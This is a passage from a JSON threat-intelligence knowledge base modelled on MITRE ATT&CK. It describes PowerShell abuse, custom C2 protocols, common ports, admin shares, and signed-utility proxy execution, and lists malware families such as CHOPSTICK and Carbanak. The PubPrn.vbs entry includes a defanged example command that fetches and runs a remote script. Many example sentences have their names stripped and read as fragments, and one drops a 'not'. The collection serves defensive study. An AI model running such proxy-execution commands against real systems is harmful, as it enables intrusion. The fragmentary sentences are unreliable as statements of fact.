      "malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.",
      "has used powershell.exe to download and execute scripts.",
      "used PowerShell scripts for execution.",
      "has used a custom executable to execute PowerShell scripts.",
      "downloads and executes PowerShell scripts.",
      "uses PowerShell scripts for execution.",
      "leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.",
      "can write and execute PowerShell scripts.",
      "has used PowerShell for execution.",
      "has a module for loading and executing PowerShell scripts.",
      "uses PowerShell.",
      "has used PowerShell for execution of a payload.",
      "malicious spearphishing payloads are executed as .  has also used  during and.",
      "modules are written in and executed via .",
      "has used PowerShell for execution.",
      "has used PowerShell for execution.",
      "One version of  uses a PowerShell script.",
      "has used PowerShell for execution and privilege escalation.",
      "has used PowerShell Empire.",
      "uses PowerShell for execution.",
      "is written in PowerShell.",
      "has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.",
      "uses a PowerShell script to launch shellcode that retrieves an additional payload.",
      "has used PowerShell-based tools and shellcode loaders for execution.",
      "can execute a payload on a remote host with PowerShell. This technique does write any data to disk.",
      "has used PowerShell for execution.",
      "is known to use PowerShell.",
      "downloads a PowerShell script that decodes to a typical shellcode loader.",
      "uses PowerShell for execution as well as PowerShell Empire to establish persistence.",
      "uses PowerShell to execute various commands, one to execute its payload.",
      "uses a module to execute Mimikatz with PowerShell to perform .",
      "can execute PowerShell scripts.",
      "is a PowerShell backdoor.",
      "uses  to inject shellcode into PowerShell.",
      "used  to download payloads, run a reverse shell, and execute malware on the victim's machine.",
      "malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.",
      "has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.",
      "The 's Information Gathering Tool (IGT) includes PowerShell components.",
      "has used PowerShell on victim systems to download and run payloads after exploitation.",
      "has used encoded PowerShell scripts uploaded to  installations to download and install .  also used PowerShell scripts to evade defenses.",
      "has used PowerShell scripts to download and execute programs in memory, without writing to disk."
    ],
    "id": "T1086",
    "name": "PowerShell",
    "similar_words": [
      "PowerShell"
    ]
  },
  "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe": {
    "description": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png\n\nThere are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)",
    "example_uses": [
      "has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses."
    ],
    "id": "T1216",
    "name": "Signed Script Proxy Execution",
    "similar_words": [
      "Signed Script Proxy Execution"
    ]
  },
  "attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00": {
    "description": "Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Standard Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.",
    "example_uses": [
      "uses a custom TCP protocol for C2.",
      "binds to a raw socket on a random source port between 31800 and 31900 for C2.",
      "network traffic communicates over a raw socket.",
      "The  malware platform can use ICMP to communicate between infected computers.",
      "uses raw sockets to communicate with its C2 server.",
      "communicates over raw TCP.",
      "has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.",
      "uses a custom binary protocol for C2 communications.",
      "communicates via ICMP for C2.",
      "completes network communication via raw sockets.",
      "If  does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,  will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.",
      "network traffic can communicate over a raw socket.",
      "Some  variants use raw TCP for C2.",
      "uses a custom DNS tunneling protocol for C2.",
      "communicates with its C2 servers through a TCP socket.",
      "A  variant uses fake TLS to communicate with the C2 server.",
      "can be configured to use raw TCP or UDP for command and control.",
      "C2 traffic can communicate via TCP raw sockets.",
      "is capable of using ICMP, TCP, and UDP for C2.",
      "uses a custom UDP protocol to communicate.",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "A  variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.",
      "connects to C2 infrastructure and establishes backdoors over a custom communications protocol.",
      "credential stealer ZUMKONG emails credentials from the victim using HTTP POST requests.",
      "has used custom DNS Tunneling protocols for C2.",
      "uses a custom binary protocol to beacon back to its C2 server. It has also used XOR for encrypting communications.",
      "allows adversaries to modify the way the \"beacon\" payload communicates. This is called \"Malleable C2\" in the  manual and is intended to allow a penetration test team to mimic known APT C2 methods.",
      "uses 's malleable C2 functionality to blend in with network traffic.",
      "can communicate to its C2 over TCP using a custom binary protocol.",
      "uses HTTP POST requests with data formatted using a custom protocol.",
      "is capable of using its command and control protocol over port 443. However, Duqu is also capable of encapsulating its command protocol over standard application layer protocols. The Duqu command and control protocol implements many of the same features as TCP and is a reliable transport protocol."
    ],
    "id": "T1094",
    "name": "Custom Command and Control Protocol",
    "similar_words": [
      "Custom Command and Control Protocol"
    ]
  },
  "attack-pattern--f792d02f-813d-402b-86a5-ab98cb391d3b": {
    "description": "InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft.\n\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)",
    "example_uses": [],
    "id": "T1118",
    "name": "InstallUtil",
    "similar_words": [
      "InstallUtil"
    ]
  },
  "attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e": {
    "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
    "example_uses": [
      "attempted to contact the C2 server over TCP using port 80.",
      "uses port 443 for the control server communications.",
      "uses port 443 for C2.",
      "variants can use ports 443, 8443, and 8080 for communications.",
      "has used ports 53, 80, 443, and 8080 for C2.",
      "used SMB over ports 445 or 139 for C2. The group also established encrypted connections over port 443.",
      "uses port 8000 and 443 for C2.",
      "uses Port Numbers 443 and 80 for the C2 server.",
      "uses port 80 for C2.",
      "used TCP port 80 for C2.",
      "uses 443 for C2 communications.",
      "uses port 80 for C2.",
      "uses Port Numbers 80, 8080, 8000, and 443 for communication to the C2 servers.",
      "binds and listens on port 443.",
      "uses port 443 for C2 communications.",
      "uses port 443 for C2 communications.",
      "uses port 443 for C2.",
      "has used port 8080 for C2.",
      "has tunneled RDP backdoors over port 443.",
      "connects to external C2 infrastructure over port 443.",
      "connects to external C2 infrastructure over port 443.",
      "connects to external C2 infrastructure over the HTTP port.",
      "has used port 80 for C2.",
      "connects to external C2 infrastructure and opens a backdoor over port 443.",
      "uses commonly used ports (like HTTPS/443) for command and control.",
      "malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.",
      "A variant of  attempts communication to the C2 server over HTTP on port 443.",
      "uses HTTP over port 443 for command and control.",
      "Some  variants use ports 8080 and 8000 for C2.",
      "uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.",
      "communicates over common ports such as TCP 80, 443, and 25.",
      "communicates with its C2 domain over ports 443 and 8443.",
      "connects over 443 for C2.",
      "communicates with its C2 server over port 443.",
      "communicates over ports 80, 443, 53, and 8080 via raw sockets instead of the protocols usually associated with the ports.",
      "uses a specific port of 443 and can also use ports 53 and 80 for C2. One  variant uses HTTP over port 443 to connect to its C2 server.",
      "uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.",
      "One  variant connected to its C2 server over port 8080.",
      "operates over ports 21 and 20.",
      "command and control occurs via HTTPS over port 443.",
      "network traffic communicates over common ports like 80, 443, or 1433.",
      "beacons to destination port 443.",
      "uses ports 80, 443, and 8080 for C2.",
      "has beaconed to its C2 over port 443.",
      "is a RAT that communicates with HTTP.",
      "communicates over port 80 for C2.",
      "has used TCP port 8080 for C2.",
      "uses HTTP TCP port 80 and HTTPS TCP port 443 for communications.",
      "uses port 8080 for C2.",
      "Some  malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.",
      "C2 traffic for most  tools occurs over Port Numbers 53, 80, and 443."
    ],
    "id": "T1043",
    "name": "Commonly Used Port",
    "similar_words": [
      "Commonly Used Port"
    ]
  },
  "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b": {
    "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1063). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",
    "example_uses": [
      "has used CVE-2015-4902 to bypass security features."
    ],
    "id": "T1211",
    "name": "Exploitation for Defense Evasion",
    "similar_words": [
      "Exploitation for Defense Evasion"
    ]
  },
  "attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b": {
    "description": "There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.\n\n### MSBuild\n\nMSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. (Citation: MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)\n\n### DNX\n\nThe .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft Migrating from DNX) DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n\n### RCSI\n\nThe rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe. (Citation: engima0x3 RCSI Bypass)\n\n### WinDbg/CDB\n\nWinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. (Citation: Microsoft Debugging Tools for Windows) They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.\n\n### Tracker\n\nThe file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system. (Citation: Microsoft Docs File Tracking)\n\nAn adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions. (Citation: Twitter SubTee Tracker.exe)",
    "example_uses": [
      "A version of  loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques."
    ],
    "id": "T1127",
    "name": "Trusted Developer Utilities",
    "similar_words": [
      "Trusted Developer Utilities"
    ]
  },
  "attack-pattern--ffe742ed-9100-4686-9e00-c331da544787": {
    "description": "Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. \n\nAdversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares)\n\nThe [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials. (Citation: Technet Net Use)",
    "example_uses": [
      "has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.",
      "copies itself over network shares to move laterally on a victim network.",
      "has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.",
      "can use Window admin shares (C$ and ADMIN$) for lateral movement.",
      "will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.",
      "has run a plug-in on a victim to spread through the local network by using  and accessing admin shares.",
      "Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.",
      "The  malware platform can use Windows admin shares to move laterally.",
      "accesses network share(s), enables share access to the target device, and copies an executable payload to the target system, and uses a  to execute the malware.",
      "uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.",
      "Lateral movement can be done with  through net use commands to connect to the on remote systems.",
      ", a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.",
      "malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.",
      "actors mapped network drives using net use.",
      "used net use commands to connect to lateral systems within a network.",
      "uses net.exe to connect to network shares using net use commands with compromised credentials.",
      "actors have been known to copy files to the network shares of other computers to move laterally."
    ],
    "id": "T1077",
    "name": "Windows Admin Shares",
    "similar_words": [
      "Windows Admin Shares"
    ]
  },
  "malware--7bec698a-7e20-4fd3-bb6a-12787770fb1a": {
    "id": "S0066",
    "name": "3PARA RAT",
    "examples": [],
    "similar_words": [
      "3PARA RAT"
    ],
    "description": "[3PARA RAT](https://attack.mitre.org/software/S0066) is a remote access tool (RAT) programmed in C++ that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024). (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--8e461ca3-0996-4e6e-a0df-e2a5bbc51ebc": {
    "id": "S0065",
    "name": "4H RAT",
    "examples": [],
    "similar_words": [
      "4H RAT"
    ],
    "description": "[4H RAT](https://attack.mitre.org/software/S0065) is malware that has been used by [Putter Panda](https://attack.mitre.org/groups/G0024) since at least 2007. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--fb575479-14ef-41e9-bfab-0b7cf10bec73": {
    "id": "S0045",
    "name": "ADVSTORESHELL",
    "examples": [],
    "similar_words": [
      "ADVSTORESHELL",
      "AZZY",
      "EVILTOSS",
      "NETUI",
      "Sedreco"
    ],
    "description": "[ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)",
    "example_uses": []
  },
  "malware--56f46b17-8cfa-46c0-b501-dd52fef394e2": {
    "id": "S0073",
    "name": "ASPXSpy",
    "examples": [],
    "similar_words": [
      "ASPXSpy",
      "ASPXTool"
    ],
    "description": "[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--40d3e230-ed32-469f-ba89-be70cc08ab39": {
    "id": "S0092",
    "name": "Agent.btz",
    "examples": [],
    "similar_words": [
      "Agent.btz"
    ],
    "description": "[Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. (Citation: Securelist Agent.btz)",
    "example_uses": []
  },
  "malware--f5352566-1a64-49ac-8f7f-97e1d1a03300": {
    "id": "S0129",
    "name": "AutoIt backdoor",
    "examples": [],
    "similar_words": [
      "AutoIt backdoor"
    ],
    "description": "[AutoIt backdoor](https://attack.mitre.org/software/S0129) is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.",
    "example_uses": []
  },
  "malware--fb261c56-b80e-43a9-8351-c84081e7213d": {
    "id": "S0031",
    "name": "BACKSPACE",
    "examples": [],
    "similar_words": [
      "BACKSPACE",
      "Lecna"
    ],
    "description": "[BACKSPACE](https://attack.mitre.org/software/S0031) is a backdoor used by [APT30](https://attack.mitre.org/groups/G0013) that dates back to at least 2005. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--9dbdadb6-fdbf-490f-a35f-38762d06a0d2": {
    "id": "S0245",
    "name": "BADCALL",
    "examples": [],
    "similar_words": [
      "BADCALL"
    ],
    "description": "[BADCALL](https://attack.mitre.org/software/S0245) is a Trojan malware variant used by the group [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT BADCALL)",
    "example_uses": []
  },
  "malware--e9595678-d269-469e-ae6b-75e49259de63": {
    "id": "S0128",
    "name": "BADNEWS",
    "examples": [],
    "similar_words": [
      "BADNEWS"
    ],
    "description": "[BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--64d76fa5-cf8f-469c-b78c-1a4f7c5bad80": {
    "id": "S0127",
    "name": "BBSRAT",
    "examples": [],
    "similar_words": [
      "BBSRAT"
    ],
    "description": "[BBSRAT](https://attack.mitre.org/software/S0127) is malware with remote access tool functionality that has been used in targeted compromises. (Citation: Palo Alto Networks BBSRAT)",
    "example_uses": []
  },
  "malware--b8eb28e4-48a6-40ae-951a-328714f75eda": {
    "id": "S0017",
    "name": "BISCUIT",
    "examples": [],
    "similar_words": [
      "BISCUIT"
    ],
    "description": "[BISCUIT](https://attack.mitre.org/software/S0017) is a backdoor that has been used by [APT1](https://attack.mitre.org/groups/G0006) since as early as 2007. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--d69c8146-ab35-4d50-8382-6fc80e641d43": {
    "id": "S0069",
    "name": "BLACKCOFFEE",
    "examples": [],
    "similar_words": [
      "BLACKCOFFEE"
    ],
    "description": "[BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--da2ef4a9-7cbe-400a-a379-e2f230f28db3": {
    "id": "S0114",
    "name": "BOOTRASH",
    "examples": [],
    "similar_words": [
      "BOOTRASH"
    ],
    "description": "[BOOTRASH](https://attack.mitre.org/software/S0114) is a [Bootkit](https://attack.mitre.org/techniques/T1067) that targets Windows operating systems. It has been used by threat actors that target the financial sector. (Citation: MTrends 2016)",
    "example_uses": []
  },
  "malware--67fc172a-36fa-4a35-88eb-4ba730ed52a6": {
    "id": "S0014",
    "name": "BS2005",
    "examples": [],
    "similar_words": [
      "BS2005"
    ],
    "description": "[BS2005](https://attack.mitre.org/software/S0014) is malware that was used by [Ke3chang](https://attack.mitre.org/groups/G0004) in spearphishing campaigns since at least 2011. (Citation: Villeneuve et al 2014)",
    "example_uses": []
  },
  "malware--123bd7b3-675c-4b1a-8482-c55782b20e2b": {
    "id": "S0043",
    "name": "BUBBLEWRAP",
    "examples": [],
    "similar_words": [
      "BUBBLEWRAP",
      "Backdoor.APT.FakeWinHTTPHelper"
    ],
    "description": "[BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)",
    "example_uses": []
  },
  "malware--083bb47b-02c8-4423-81a2-f9ef58572974": {
    "id": "S0093",
    "name": "Backdoor.Oldrea",
    "examples": [],
    "similar_words": [
      "Backdoor.Oldrea",
      "Havex"
    ],
    "description": "[Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a backdoor used by [Dragonfly](https://attack.mitre.org/groups/G0035). It appears to be custom malware authored by the group or specifically for it. (Citation: Symantec Dragonfly)",
    "example_uses": []
  },
  "malware--835a79f1-842d-472d-b8f4-d54b545c341b": {
    "id": "S0234",
    "name": "Bandook",
    "examples": [],
    "similar_words": [
      "Bandook"
    ],
    "description": "[Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written in Delphi, which has been available since roughly 2007  (Citation: EFF Manul Aug 2016) (Citation: Lookout Dark Caracal Jan 2018).",
    "example_uses": []
  },
  "malware--1f6e3702-7ca1-4582-b2e7-4591297d05a8": {
    "id": "S0239",
    "name": "Bankshot",
    "examples": [],
    "similar_words": [
      "Bankshot",
      "Trojan Manuscript"
    ],
    "description": "[Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) used the [Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish financial sector. (Citation: McAfee Bankshot)",
    "example_uses": []
  },
  "malware--65ffc206-d7c1-45b3-b543-f6b726e7840d": {
    "id": "S0268",
    "name": "Bisonal",
    "examples": [],
    "similar_words": [
      "Bisonal"
    ],
    "description": "[Bisonal](https://attack.mitre.org/software/S0268) is malware that has been used in attacks against targets in Russia, South Korea, and Japan. It has been observed in the wild since 2014. (Citation: Unit 42 Bisonal July 2018)",
    "example_uses": []
  },
  "malware--54cc1d4f-5c53-4f0e-9ef5-11b4998e82e4": {
    "id": "S0089",
    "name": "BlackEnergy",
    "examples": [],
    "similar_words": [
      "BlackEnergy",
      "Black Energy"
    ],
    "description": "[BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014)",
    "example_uses": []
  },
  "malware--28b97733-ef07-4414-aaa5-df50b2d30cc5": {
    "id": "S0252",
    "name": "Brave Prince",
    "examples": [],
    "similar_words": [
      "Brave Prince"
    ],
    "description": "[Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to [Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
  "malware--79499993-a8d6-45eb-b343-bf58dea5bdde": {
    "id": "S0204",
    "name": "Briba",
    "examples": [],
    "similar_words": [
      "Briba"
    ],
    "description": "[Briba](https://attack.mitre.org/software/S0204) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba May 2012)",
    "example_uses": []
  },
  "malware--5a84dc36-df0d-4053-9b7c-f0c388a57283": {
    "id": "S0025",
    "name": "CALENDAR",
    "examples": [],
    "similar_words": [
      "CALENDAR"
    ],
    "description": "[CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--b0f13390-cec7-4814-b37c-ccec01887faa": {
    "id": "S0222",
    "name": "CCBkdr",
    "examples": [],
    "similar_words": [
      "CCBkdr"
    ],
    "description": "[CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)",
    "example_uses": []
  },
  "malware--ccd61dfc-b03f-4689-8c18-7c97eab08472": {
    "id": "S0023",
    "name": "CHOPSTICK",
    "examples": [],
    "similar_words": [
      "CHOPSTICK",
      "Backdoor.SofacyX",
      "SPLM",
      "Xagent",
      "X-Agent",
      "webhp"
    ],
    "description": "[CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [Android version of the malware](https://attack.mitre.org/software/S0314).",
    "example_uses": []
  },
  "malware--8ab98e25-1672-4b5f-a2fb-e60f08a5ea9e": {
    "id": "S0212",
    "name": "CORALDECK",
    "examples": [],
    "similar_words": [
      "CORALDECK"
    ],
    "description": "[CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by [ScarCruft](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--60c18d06-7b91-4742-bae3-647845cd9d81": {
    "id": "S0137",
    "name": "CORESHELL",
    "examples": [],
    "similar_words": [
      "CORESHELL",
      "Sofacy",
      "SOURFACE"
    ],
    "description": "[CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by [APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are known as SOURFACE and newer versions as CORESHELL. It has also been referred to as Sofacy, though that term has been used widely to refer to both the group [APT28](https://attack.mitre.org/groups/G0007) and malware families associated with the group. (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--b8fdef82-d2cf-4948-8949-6466357b1be1": {
    "id": "S0274",
    "name": "Calisto",
    "examples": [],
    "similar_words": [
      "Calisto"
    ],
    "description": "[Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018)",
    "example_uses": []
  },
  "malware--cb7bcf6f-085f-41db-81ee-4b68481661b5": {
    "id": "S0077",
    "name": "CallMe",
    "examples": [],
    "similar_words": [
      "CallMe"
    ],
    "description": "[CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--72f54d66-675d-4587-9bd3-4ed09f9522e4": {
    "id": "S0030",
    "name": "Carbanak",
    "examples": [],
    "similar_words": [
      "Carbanak",
      "Anunak"
    ],
    "description": "[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)",
    "example_uses": []
  },
  "malware--8d9e758b-735f-4cbc-ba7c-32cd15138b2a": {
    "id": "S0261",
    "name": "Catchamas",
    "examples": [],
    "similar_words": [
      "Catchamas"
    ],
    "description": "[Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals information from compromised systems. (Citation: Symantec Catchamas April 2018)",
    "example_uses": []
  },
  "malware--dc5d1a33-62aa-4a0c-aa8c-589b87beb11e": {
    "id": "S0144",
    "name": "ChChes",
    "examples": [],
    "similar_words": [
      "ChChes",
      "Scorpion",
      "HAYMAKER"
